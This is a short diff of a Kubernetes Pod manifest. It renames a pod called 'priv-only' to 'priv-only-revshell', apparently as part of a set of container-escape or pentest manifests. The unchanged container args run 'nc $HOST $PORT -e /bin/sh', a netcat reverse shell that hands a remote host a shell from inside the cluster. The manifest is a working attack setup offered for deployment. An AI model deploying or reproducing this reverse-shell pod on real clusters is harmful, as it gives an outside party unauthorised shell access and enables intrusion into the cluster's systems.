@@ -6,12 +6,12 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-only
+  name: pod-priv-only-revshell
   labels: 
-    app: priv-only
+    app: priv-only-revshell
 spec:
   containers:
-  - name: priv-only
+  - name: priv-only-revshell
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
